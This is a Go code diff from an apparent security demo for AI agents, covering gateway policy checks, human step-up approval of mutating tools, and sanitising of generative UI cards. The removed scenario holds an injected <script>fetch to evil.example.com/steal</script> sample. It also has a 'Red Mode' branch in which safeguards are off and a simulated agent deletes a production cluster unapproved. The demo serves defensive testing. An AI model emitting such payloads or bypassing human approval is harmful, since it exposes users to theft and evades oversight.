@@ -5,10 +5,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"net/url"
 	"regexp"
 	"strings"
-	"time"
 
 	"google.golang.org/adk/v2/agentregistry"
 	"google.golang.org/adk/v2/tool/toolconfirmation"
@@ -16,7 +14,6 @@ import (
 )
 
 func init() {
-	RegisterScenarioHandler(Scenario03AgentGatewayAndStepUp, executeScenario03)
 	RegisterHTTPRoutes(registerGovernanceHTTPRoutes)
 }
 
@@ -44,6 +41,29 @@ func registerGovernanceHTTPRoutes(mux *http.ServeMux, rt *Runtime) {
 			return
 		}
 		writeJSON(w, http.StatusOK, res)
+	})
+
+	mux.HandleFunc("POST /api/sessions/{sessionId}/confirmations/stream", func(w http.ResponseWriter, r *http.Request) {
+		sessionID := r.PathValue("sessionId")
+		var req ConfirmationResolution
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
+			return
+		}
+		req.SessionID = sessionID
+		snap := rt.GetOrCreateSession(sessionID)
+		if snap.PendingConfirmation == nil {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": fmt.Sprintf("session %q has no pending StepUpConfirmation", sessionID)})
+			return
+		}
+		if req.ConfirmationID != "" && snap.PendingConfirmation.ConfirmationID != req.ConfirmationID {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": fmt.Sprintf("confirmation ID mismatch: got %q, want %q", req.ConfirmationID, snap.PendingConfirmation.ConfirmationID)})
+			return
+		}
+		sink := initSSESink(w)
+		if _, err := rt.ResolveConfirmationStream(r.Context(), req, sink); err != nil {
+			writeSSEError(w, err)
+		}
 	})
 }
 
@@ -92,41 +112,8 @@ var (
 // google.golang.org/adk/v2/agentregistry.New and falls back to the governed local
 // manifest when no live endpoint is configured or reachable.
 func (r *Runtime) DiscoverRegistryResources(ctx context.Context) (*RegistryCatalog, error) {
-	cfg := r.Config()
-	if strings.TrimSpace(cfg.AgentRegistryURL) != "" {
-		baseTransport := http.DefaultTransport
-		if cfg.HTTPClient != nil && cfg.HTTPClient.Transport != nil {
-			baseTransport = cfg.HTTPClient.Transport
-		}
-		targetURL, err := url.Parse(strings.TrimRight(cfg.AgentRegistryURL, "/"))
-		if err == nil && targetURL.Host != "" {
-			hc := &http.Client{
-				Transport: &registryRewriteTransport{
-					base:   baseTransport,
-					target: targetURL,
-				},
-				Timeout: 5 * time.Second,
-			}
-			regClient, err := agentregistry.New(ctx, agentregistry.Config{
-				ProjectID:  "aegis-sre",
-				Location:   "us-central1",
-				HTTPClient: hc,
-			})
-			if err == nil {
-				mcpResp, mcpErr := regClient.ListMCPServers(ctx)
-				agentResp, agentErr := regClient.ListAgents(ctx)
-				if mcpErr == nil && agentErr == nil && len(mcpResp.MCPServers) > 0 {
-					return &RegistryCatalog{
-						Source:     "agentregistry_api",
-						MCPServers: mcpResp.MCPServers,
-						Agents:     agentResp.Agents,
-					}, nil
-				}
-			}
-		}
-	}
-
-	return defaultRegistryCatalog(), nil
+	cat, _, err := NewAgentRegistryConnector(r).DiscoverGovernedResources(ctx)
+	return cat, err
 }
 
 // VerifyMCPEndpoint ensures that a target MCP server ID or URL is registered in
@@ -156,19 +143,6 @@ func (r *Runtime) VerifyMCPEndpoint(ctx context.Context, serverRefOrURL string) 
 		}
 	}
 	return nil, fmt.Errorf("agentregistry: MCP server %q is not registered in the governed catalog", serverRefOrURL)
-}
-
-type registryRewriteTransport struct {
-	base   http.RoundTripper
-	target *url.URL
-}
-
-func (t *registryRewriteTransport) RoundTrip(req *http.Request) (*http.Response, error) {
-	cloned := req.Clone(req.Context())
-	cloned.URL.Scheme = t.target.Scheme
-	cloned.URL.Host = t.target.Host
-	cloned.Host = t.target.Host
-	return t.base.RoundTrip(cloned)
 }
 
 func defaultRegistryCatalog() *RegistryCatalog {
@@ -426,230 +400,17 @@ func buildADKStepUpConfirmation(confirmationID, targetTool, targetResource, hint
 	}, nil
 }
 
-func executeScenario03(ctx context.Context, rt *Runtime, req TurnRequest) (*TurnResult, error) {
-	catalog, err := rt.DiscoverRegistryResources(ctx)
-	if err != nil {
-		return nil, err
-	}
-
-	trace := make([]BoundaryTraceEvent, 0, 5)
-	wireRecords := make([]OutboundWireRecord, 0, 3)
-
-	if req.Posture.StepUpAndA2UICatalogEnabled {
-		// 1. Boundary 4: Agent Registry Discovery
-		trace = append(trace, BoundaryTraceEvent{
-			Order:     1,
-			Boundary:  BoundaryPlatformGovernance,
-			Shield:    "Agent Registry + Agent Gateway UAP",
-			Component: "adk/v2/agentregistry",
-			Action:    "ListMCPServers & ListAgents",
-			Verdict:   VerdictAllowed,
-			Detail:    fmt.Sprintf("Discovered %d governed MCP servers (logging, container, github-mcp, jira-mcp) and %d A2A peer (%s)", len(catalog.MCPServers), len(catalog.Agents), catalog.Source),
-			Timestamp: time.Now().UTC(),
-		})
-
-		// 2. Boundary 4: Agent Gateway UAP allows read-only observability tools
-		uapLogging := EvaluateAgentGatewayUAP("logging.entries.list", true, req.Posture)
-		uapClusterGet := EvaluateAgentGatewayUAP("container.clusters.get", true, req.Posture)
-		trace = append(trace, BoundaryTraceEvent{
-			Order:     2,
-			Boundary:  BoundaryPlatformGovernance,
-			Shield:    "Agent Gateway UAP (roles/iap.egressor)",
-			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
-			Action:    "logging.entries.list & container.clusters.get",
-			Verdict:   uapLogging.Verdict,
-			Detail:    uapLogging.Reason + " | " + uapClusterGet.Reason,
-			Metadata: map[string]string{
-				"cel": uapLogging.CELExpression,
-			},
-			Timestamp: time.Now().UTC(),
-		})
-		wireRecords = append(wireRecords,
-			OutboundWireRecord{
-				Provider:          ProviderGCPIAM,
-				ToolName:          "logging.entries.list",
-				Method:            http.MethodPost,
-				URL:               "https://logging.googleapis.com/mcp",
-				AuthHeaderPresent: true,
-				AuthPrincipal:     string(req.Persona),
-				StatusCode:        http.StatusOK,
-			},
-			OutboundWireRecord{
-				Provider:          ProviderGCPIAM,
-				ToolName:          "container.clusters.get",
-				Method:            http.MethodPost,
-				URL:               "https://container.googleapis.com/mcp",
-				AuthHeaderPresent: true,
-				AuthPrincipal:     string(req.Persona),
-				StatusCode:        http.StatusOK,
-			},
-		)
-
-		// 3. Boundary 4: Agent Gateway UAP blocks destructive tool container.clusters.delete
-		uapClusterDelete := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
-		trace = append(trace, BoundaryTraceEvent{
-			Order:     3,
-			Boundary:  BoundaryPlatformGovernance,
-			Shield:    "Agent Gateway UAP (roles/iap.egressor)",
-			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
-			Action:    "container.clusters.delete",
-			Verdict:   uapClusterDelete.Verdict,
-			Detail:    uapClusterDelete.Reason,
-			Metadata: map[string]string{
-				"cel":      uapClusterDelete.CELExpression,
-				"toolName": "container.clusters.delete",
-			},
-			Timestamp: time.Now().UTC(),
-		})
-
-		// 4. Boundary 1: ADK Go v2 adk_request_confirmation Step-Up HITL + A2UI v0.9 Sanitization
-		confirmationID := fmt.Sprintf("confirm-%s-pr-42", req.SessionID)
-		stepUp, err := buildADKStepUpConfirmation(
-			confirmationID,
-			"create_github_pull_request",
-			"github.com/gke-demos/checkout-service/pulls",
-			"Operator approval required before creating GitHub Pull Request #42 (fix nil pointer in checkout handler) and posting Jira comment on SEC-101.",
-			map[string]string{
-				"repo":        "gke-demos/checkout-service",
-				"base":        "main",
-				"head":        "fix/checkout-502-nil-guard",
-				"title":       "fix(checkout): guard nil RetryPolicy on v2.4 rollout",
-				"jiraFollowUp": "post_jira_comment(SEC-101)",
-			},
-		)
-		if err != nil {
-			return nil, err
-		}
-
-		rawStepUpCard := A2UICard{
-			SurfaceID: "card-stepup-s3",
-			MimeType:  "application/json+a2ui",
-			Version:   "0.9",
-			Type:      CardStepUpConfirmation,
-			Title:     "Step-Up Approval Required: Create GitHub PR & Post Jira Update",
-			Subtitle:  "Boundary 1 & 4: Agent Gateway UAP Blocked Cluster Delete; Mutating PR Paused on adk_request_confirmation",
-			Severity:  "WARNING",
-			Body:      "Agent Gateway UAP blocked destructive tool container.clusters.delete (isReadOnly=false). Proposed safe remediation: create GitHub PR #42. Untrusted crash log note: <script>fetch('https://evil.example.com/steal')</script> NullPointerException in checkout/handler.go:88.",
-			Fields: map[string]string{
-				"Confirmation ID": stepUp.ConfirmationID,
-				"Function Call":   stepUp.FunctionCall,
-				"Target Tool":     stepUp.TargetTool,
-				"Target Repo":     "gke-demos/checkout-service (fix/checkout-502-nil-guard -> main)",
-				"Blocked by UAP":  "container.clusters.delete (DENIED by roles/iap.egressor CEL policy)",
-			},
-			Actions: []A2UICardAction{
-				{
-					ID:       "act-approve-s3",
-					Label:    "Approve PR & Jira Update",
-					Kind:     "step_up_approve",
-					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
-					Payload: map[string]string{
-						"confirmationId": stepUp.ConfirmationID,
-						"confirmed":      "true",
-					},
-				},
-				{
-					ID:       "act-reject-s3",
-					Label:    "Reject Mutation",
-					Kind:     "step_up_reject",
-					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
-					Payload: map[string]string{
-						"confirmationId": stepUp.ConfirmationID,
-						"confirmed":      "false",
-					},
-				},
-			},
-		}
-
-		validatedCard, err := ValidateAndSanitizeA2UICard(rawStepUpCard, req.Posture)
-		if err != nil {
-			return nil, err
-		}
-
-		trace = append(trace, BoundaryTraceEvent{
-			Order:     4,
-			Boundary:  BoundaryGenerativeUI,
-			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
-			Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
-			Action:    toolconfirmation.FunctionCallName + "(create_github_pull_request)",
-			Verdict:   VerdictChallenge,
-			Detail:    "Paused state-mutating tool create_github_pull_request on adk_request_confirmation and stripped injected <script> tag from A2UI v0.9 StepUpConfirmationCard",
-			Timestamp: time.Now().UTC(),
-		})
-
-		return &TurnResult{
-			SessionID:             req.SessionID,
-			Persona:               req.Persona,
-			ScenarioID:            req.ScenarioID,
-			Posture:               req.Posture,
-			Outcome:               OutcomeApprovalRequired,
-			AssistantText:         "Read-only GKE and Cloud Logging MCP diagnostics succeeded via Agent Gateway. Destructive tool container.clusters.delete was blocked by UAP CEL policy. Awaiting Operator Step-Up Confirmation (adk_request_confirmation) before creating GitHub Pull Request #42.",
-			SanitizedInputPreview: validatedCard.Body,
-			Cards:                 []A2UICard{validatedCard},
-			BoundaryTrace:         trace,
-			StepUpConfirmation:    stepUp,
-			WireRecords:           wireRecords,
-		}, nil
-	}
-
-	// Red Mode: StepUpAndA2UICatalogEnabled is false.
-	uapBypass := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
-	trace = append(trace,
-		BoundaryTraceEvent{
-			Order:     1,
-			Boundary:  BoundaryPlatformGovernance,
-			Shield:    "Agent Registry + Agent Gateway UAP",
-			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
-			Action:    "container.clusters.delete",
-			Verdict:   uapBypass.Verdict,
-			Detail:    "Agent Gateway UAP disabled in Red Mode: destructive tool container.clusters.delete and unverified MCP calls executed without CEL policy checks!",
-			Timestamp: time.Now().UTC(),
-		},
-		BoundaryTraceEvent{
-			Order:     2,
-			Boundary:  BoundaryGenerativeUI,
-			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
-			Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
-			Action:    "create_github_pull_request & post_jira_comment",
-			Verdict:   VerdictBypassedRed,
-			Detail:    "adk_request_confirmation and A2UI v0.9 catalog validation bypassed in Red Mode: state-mutating PR created without human approval and raw <script> XSS rendered!",
-			Timestamp: time.Now().UTC(),
-		},
-	)
-
-	redCard, _ := ValidateAndSanitizeA2UICard(A2UICard{
-		SurfaceID: "card-exploited-s3",
-		MimeType:  "application/json+a2ui",
-		Version:   "0.9",
-		Type:      CardIncidentSummary,
-		Title:     "RED MODE EXPLOITED: Unapproved Mutation Executed & Generative UI XSS Unsanitized",
-		Subtitle:  "Boundary 1 & 4 Bypassed",
-		Severity:  "DANGER",
-		Body:      "Without Agent Gateway UAP, adk_request_confirmation, or A2UI v0.9 catalog validation, the agent executed container.clusters.delete and create_github_pull_request without Operator approval and emitted raw XSS: <script>fetch('https://evil.example.com/steal')</script>",
-		Fields: map[string]string{
-			"Unapproved Tool 1": "container.clusters.delete(prod-checkout-us-central1)",
-			"Unapproved Tool 2": "create_github_pull_request(gke-demos/checkout-service)",
-			"Unsanitized UI":    "<script>fetch('https://evil.example.com/steal')</script>",
-		},
-	}, req.Posture)
-
-	return &TurnResult{
-		SessionID:             req.SessionID,
-		Persona:               req.Persona,
-		ScenarioID:            req.ScenarioID,
-		Posture:               req.Posture,
-		Outcome:               OutcomeExploitedRed,
-		AssistantText:         "RED MODE EXPLOIT: Executed destructive container.clusters.delete and unapproved create_github_pull_request without adk_request_confirmation!",
-		SanitizedInputPreview: redCard.Body,
-		Cards:                 []A2UICard{redCard},
-		BoundaryTrace:         trace,
-	}, nil
+// ResolveConfirmation completes a pending ADK Go v2 adk_request_confirmation Step-Up interrupt
+// for the given session via the unified ADK runner.Runner, either executing the approved mutation
+// (Confirmed: true) or aborting it (Confirmed: false).
+func (r *Runtime) ResolveConfirmation(ctx context.Context, req ConfirmationResolution) (*TurnResult, error) {
+	return r.ResolveConfirmationStream(ctx, req, nil)
 }
 
-// ResolveConfirmation completes a pending ADK Go v2 adk_request_confirmation Step-Up interrupt
-// for the given session, either executing the approved mutation (Confirmed: true) or aborting it
-// (Confirmed: false).
-func (r *Runtime) ResolveConfirmation(ctx context.Context, req ConfirmationResolution) (*TurnResult, error) {
+// ResolveConfirmationStream completes a pending ADK Go v2 adk_request_confirmation Step-Up interrupt
+// for the given session via the unified ADK runner.Runner, emitting real-time TurnStreamEvent frames
+// to sink when non-nil.
+func (r *Runtime) ResolveConfirmationStream(ctx context.Context, req ConfirmationResolution, sink TurnEventSink) (*TurnResult, error) {
 	if req.SessionID == "" {
 		req.SessionID = "default-session"
 	}
@@ -662,156 +423,9 @@ func (r *Runtime) ResolveConfirmation(ctx context.Context, req ConfirmationResol
 		return nil, fmt.Errorf("confirmation ID mismatch: got %q, want %q", req.ConfirmationID, pending.ConfirmationID)
 	}
 
-	resolvedConfirmation := *pending
-	resolvedConfirmation.Pending = false
-
-	var baseTrace []BoundaryTraceEvent
-	if snap.LastTurn != nil {
-		for _, ev := range snap.LastTurn.BoundaryTrace {
-			if ev.Boundary != BoundaryGenerativeUI {
-				baseTrace = append(baseTrace, ev)
-			}
-		}
+	res, err := r.resolveConfirmationViaADKRunner(ctx, req, snap, pending, sink)
+	if err != nil {
+		return nil, err
 	}
-
-	var res *TurnResult
-	if req.Confirmed {
-		githubLive := isGitHubLive(r)
-		jiraLive := isJiraLive(r)
-
-		prURL := "https://github.com/gke-demos/checkout-service/pull/42"
-		b1Provenance := ProvenanceFixture
-		wireRecords := make([]OutboundWireRecord, 0, 2)
-
-		if githubLive {
-			b1Provenance = ProvenanceLive
-			livePRURL, ghWires, err := executeLiveGitHubPullRequest(ctx, r, req.SessionID, snap.ActivePersona, resolvedConfirmation.TargetTool)
-			if err != nil {
-				return nil, err
-			}
-			if livePRURL != "" {
-				prURL = livePRURL
-			}
-			wireRecords = append(wireRecords, ghWires...)
-		} else {
-			wireRecords = append(wireRecords, OutboundWireRecord{
-				Provider:          ProviderGitHub,
-				ToolName:          resolvedConfirmation.TargetTool,
-				Method:            http.MethodPost,
-				URL:               "https://api.github.com/repos/gke-demos/checkout-service/pulls",
-				AuthHeaderPresent: true,
-				AuthPrincipal:     string(snap.ActivePersona),
-				StatusCode:        http.StatusCreated,
-				Provenance:        ProvenanceFixture,
-			})
-		}
-
-		if jiraLive {
-			b1Provenance = ProvenanceLive
-			jiraWires, err := executeLiveJiraComment(ctx, r, req.SessionID, snap.ActivePersona, snap.Posture, snap.LastTurn)
-			if err != nil {
-				return nil, err
-			}
-			wireRecords = append(wireRecords, jiraWires...)
-		}
-
-		baseTrace = append(baseTrace, BoundaryTraceEvent{
-			Order:      len(baseTrace) + 1,
-			Boundary:   BoundaryGenerativeUI,
-			Shield:     "Step-Up Confirmation + A2UI v0.9 Catalog",
-			Component:  "adk/v2/tool/toolconfirmation",
-			Action:     toolconfirmation.FunctionCallName + " -> Confirmed=true",
-			Verdict:    VerdictAllowed,
-			Provenance: b1Provenance,
-			Detail:     fmt.Sprintf("Operator %s approved %s (%s); executed create_github_pull_request (%s) and post_jira_comment", snap.ActivePersona, resolvedConfirmation.ConfirmationID, resolvedConfirmation.TargetTool, prURL),
-			Timestamp:  time.Now().UTC(),
-		})
-
-		summaryCard, err := ValidateAndSanitizeA2UICard(A2UICard{
-			SurfaceID: "card-approved-s3",
-			MimeType:  "application/json+a2ui",
-			Version:   "0.9",
-			Type:      CardIncidentSummary,
-			Title:     "Step-Up Approved: Remediation Pull Request #42 Created",
-			Subtitle:  "Boundary 1 & 4: Governed MCP + Human-Approved Mutation Completed",
-			Severity:  "SUCCESS",
-			Body:      "Operator approved adk_request_confirmation. Created GitHub PR #42 (fix/checkout-502-nil-guard) and posted incident update to Jira SEC-101.",
-			Fields: map[string]string{
-				"Confirmation ID":  resolvedConfirmation.ConfirmationID,
-				"Approved Tool":    resolvedConfirmation.TargetTool,
-				"Pull Request":     prURL,
-				"Pull Request URL": prURL,
-				"UAP Protection":   "container.clusters.delete remained BLOCKED by Agent Gateway UAP",
-			},
-		}, snap.Posture)
-		if err != nil {
-			return nil, err
-		}
-
-		res = &TurnResult{
-			SessionID:              req.SessionID,
-			Persona:                snap.ActivePersona,
-			ScenarioID:             Scenario03AgentGatewayAndStepUp,
-			Posture:                snap.Posture,
-			Outcome:                OutcomeDefendedSuccess,
-			AssistantText:          "Step-Up Confirmation approved by Operator: created GitHub Pull Request #42 and updated Jira issue SEC-101.",
-			SanitizedInputPreview:  summaryCard.Body,
-			OutboundCommentPreview: "Created PR #42 (fix/checkout-502-nil-guard) after Operator step-up approval.",
-			Cards:                  []A2UICard{summaryCard},
-			BoundaryTrace:          baseTrace,
-			StepUpConfirmation:     &resolvedConfirmation,
-			WireRecords:            wireRecords,
-		}
-	} else {
-		baseTrace = append(baseTrace, BoundaryTraceEvent{
-			Order:     len(baseTrace) + 1,
-			Boundary:  BoundaryGenerativeUI,
-			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
-			Component: "adk/v2/tool/toolconfirmation",
-			Action:    toolconfirmation.FunctionCallName + " -> Confirmed=false",
-			Verdict:   VerdictBlocked,
-			Detail:    fmt.Sprintf("Operator %s rejected %s (%s); state-mutating tool execution aborted", snap.ActivePersona, resolvedConfirmation.ConfirmationID, resolvedConfirmation.TargetTool),
-			Timestamp: time.Now().UTC(),
-		})
-
-		abortCard, err := ValidateAndSanitizeA2UICard(A2UICard{
-			SurfaceID: "card-rejected-s3",
-			MimeType:  "application/json+a2ui",
-			Version:   "0.9",
-			Type:      CardThreatIntercept,
-			Title:     "Step-Up Rejected: State-Mutating Tool Aborted by Operator",
-			Subtitle:  "Boundary 1: Human-in-the-Loop Rejection",
-			Severity:  "INFO",
-			Body:      "Operator denied adk_request_confirmation. GitHub Pull Request creation and Jira comment mutation were aborted without modifying external state.",
-			Fields: map[string]string{
-				"Confirmation ID": resolvedConfirmation.ConfirmationID,
-				"Aborted Tool":    resolvedConfirmation.TargetTool,
-				"Status":          "ABORTED_BY_OPERATOR",
-			},
-		}, snap.Posture)
-		if err != nil {
-			return nil, err
-		}
-
-		res = &TurnResult{
-			SessionID:             req.SessionID,
-			Persona:               snap.ActivePersona,
-			ScenarioID:            Scenario03AgentGatewayAndStepUp,
-			Posture:               snap.Posture,
-			Outcome:               OutcomeBlocked,
-			AssistantText:         "Operator rejected Step-Up Confirmation (adk_request_confirmation): aborted create_github_pull_request.",
-			SanitizedInputPreview: abortCard.Body,
-			Cards:                 []A2UICard{abortCard},
-			BoundaryTrace:         baseTrace,
-			StepUpConfirmation:    &resolvedConfirmation,
-		}
-	}
-
-	normalizeTurnResultProvenance(res)
-
-	r.UpdateSession(req.SessionID, func(s *SessionSnapshot) {
-		s.PendingConfirmation = nil
-		s.LastTurn = res
-	})
 	return res, nil
 }
